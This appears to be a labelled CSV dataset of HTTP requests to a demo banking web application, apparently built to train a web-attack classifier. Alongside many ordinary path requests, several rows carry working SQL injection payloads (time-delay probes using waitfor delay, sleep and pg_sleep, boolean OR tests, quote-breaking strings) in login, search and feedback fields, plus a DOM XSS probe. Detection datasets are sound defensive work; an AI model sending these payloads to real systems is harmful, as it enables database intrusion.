method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
POST,/sendFeedback,cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=xmsktkqj&subject=1&submit=H8UWZXhB'));%20waitfor%20delay%20'0:0:6'%20--%20,3,0,1,0,7,2,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/search.jsp?query=-1);%20waitfor%20delay%20'0:0:6'%20--%20,,2,0,1,0,5,2,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
POST,/sendFeedback,cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=%5c&subject=1&submit=Submit,0,0,0,0,2,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/util,,0,0,0,0,0,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=%40%40Zdpw2,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/index.jsp?content=personal_loans.htm,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/swagger/%5c.html,,0,0,0,0,0,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/default.jsp?content=JyI%3d,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=if(now()%3dsysdate()%2csleep(9)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(9)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(9)%2c0))OR%22*/,2,2,0,14,0,3,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
POST,/sendFeedback,cfile=comments.txt&comments=1&email_addr=3137%2520Laguna%2520Street%22%20AND%202%2b1-1-1%3d0%2b0%2b0%2b1%20AND%20%22Ucvd%22%3d%22Ucvd&name=xmsktkqj&subject=1&submit=Submit,0,4,0,0,4,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/Zaku48LP,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
POST,/doSubscribe,btnSubmit=(select(0)from(select(sleep(6)))v)/*'%2b(select(0)from(select(sleep(6)))v)%2b'%22%2b(select(0)from(select(sleep(6)))v)%2b%22*/&txtEmail=sample%40email.tst,2,2,0,15,0,9,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
POST,/sendFeedback,cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=xmsktkqj&subject=(select(0)from(select(sleep(6)))v)/*'%2b(select(0)from(select(sleep(6)))v)%2b'%22%2b(select(0)from(select(sleep(6)))v)%2b%22*/&submit=Submit,2,2,0,15,2,9,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
POST,/sendFeedback,cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=%40%40qFoHc&subject=1&submit=Submit,0,0,0,0,2,0,bad
GET,/swagger/2WOzqgSN');select%20pg_sleep(3);%20--%20.html,,1,0,1,1,3,2,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
POST,/sendFeedback,cfile=comments.txt&comments=1&email_addr=(select(0)from(select(sleep(3)))v)/*'%2b(select(0)from(select(sleep(3)))v)%2b'%22%2b(select(0)from(select(sleep(3)))v)%2b%22*/&name=xmsktkqj&subject=1&submit=Submit,2,2,0,15,0,9,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
POST,/sendFeedback,cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=%f0''%f0%22%22&subject=1&submit=Submit,2,2,0,0,2,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
POST,/sendFeedback,cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=xmsktkqj&subject=1&submit=if(now()%3dsysdate()%2csleep(6)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR%22*/,2,2,0,14,2,3,bad
GET,/,,0,0,0,0,0,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=1'%22,1,1,0,0,0,1,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents,,0,0,0,0,3,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
POST,/sendFeedback,cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=xmsktkqj&subject=1&submit=8UpJkDig,0,0,0,0,2,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
POST,/doSubscribe,btnSubmit=1%c0%00xa7%c0%a2&txtEmail=sample%40email.tst,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=-1%20OR%202%2b982-982-1%3d0%2b0%2b0%2b1%20--%20,0,0,1,0,4,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/index.jsp?content=(select(0)from(select(sleep(9)))v)/*'%2b(select(0)from(select(sleep(9)))v)%2b'%22%2b(select(0)from(select(sleep(9)))v)%2b%22*/,,2,2,0,15,0,9,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
POST,/doSubscribe,btnSubmit=1'%22&txtEmail=sample%40email.tst,1,1,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
POST,/sendFeedback,cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=lntdyywr&subject=1&submit=Submit,0,0,0,0,2,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
POST,/sendFeedback,cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=IYp4fUzG');%20waitfor%20delay%20'0:0:3'%20--%20&subject=1&submit=Submit,3,0,1,0,7,2,bad
POST,/sendFeedback,cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=-1%22%20OR%202%2b551-551-1%3d0%2b0%2b0%2b1%20--%20&subject=1&submit=Submit,0,1,1,0,6,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
POST,/sendFeedback,cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=xmsktkqj&subject=-1;select%20pg_sleep(3);%20--%20&submit=Submit,0,0,1,1,5,2,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
POST,/sendFeedback,cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=brkbujqv&subject=1&submit=1'%22,1,1,0,0,2,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,"/1'""1000",,1,1,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
POST,/sendFeedback,cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=xmsktkqj&subject=-1);%20waitfor%20delay%20'0:0:9'%20--%20&submit=Submit,2,0,1,0,7,2,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
POST,/sendFeedback,cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=xmsktkqj&subject=1&submit=(select(0)from(select(sleep(9)))v)/*'%2b(select(0)from(select(sleep(9)))v)%2b'%22%2b(select(0)from(select(sleep(9)))v)%2b%22*/,2,2,0,15,2,9,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
POST,/sendFeedback,cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=xmsktkqj&subject=if(now()%3dsysdate()%2csleep(6)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR%22*/&submit=Submit,2,2,0,14,2,3,bad
GET,/images/,,0,0,0,0,0,0,bad
POST,/sendFeedback,cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=brkbujqv&subject=1&submit=JyI%3d,0,0,0,0,2,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/index.jsp?content=Hcbk6Mo0,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
POST,/doLogin,btnSubmit=BCkgZHvh');%20waitfor%20delay%20'0:0:6'%20--%20&passw=g00dPa%24%24w0rD&uid=1,3,0,1,0,5,3,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp?HostName=1'%22,,1,1,0,0,0,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/cU5SlvyV');%20waitfor%20delay%20'0:0:9'%20--%20.htm,,3,0,1,0,5,2,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,"/subscribe.jsp?wvstest=javascript:domxssExecutionSink(1,%22%3Cbr%3E()locxss%22)&",,0,2,0,2,0,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp?HostName=-1'%20OR%202%2b482-482-1%3d0%2b0%2b0%2b1%20--%20,,1,0,1,0,4,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/retirement.htm,,0,0,0,0,0,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/default.jsp?content=Lk6u7VcT';%20waitfor%20delay%20'0:0:6'%20--%20,,3,0,1,0,5,2,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/util/,,0,0,0,0,0,0,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1));select%20pg_sleep(9);%20--%20,0,0,1,1,3,3,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
POST,/sendFeedback,cfile=comments.txt&comments=-1%22%20OR%203%2b371-371-1%3d0%2b0%2b0%2b1%20--%20&email_addr=3137%20Laguna%20Street&name=xmsktkqj&subject=1&submit=Submit,0,1,1,0,6,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/index.jsp?content=personal_loans.htm,,0,0,0,0,0,0,bad
POST,/doLogin,btnSubmit=Login&passw=%bf'%bf%22&uid=1,1,1,0,0,0,1,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/search.jsp?query=1,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
POST,/doSubscribe,btnSubmit=JyI%3d&txtEmail=sample%40email.tst,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
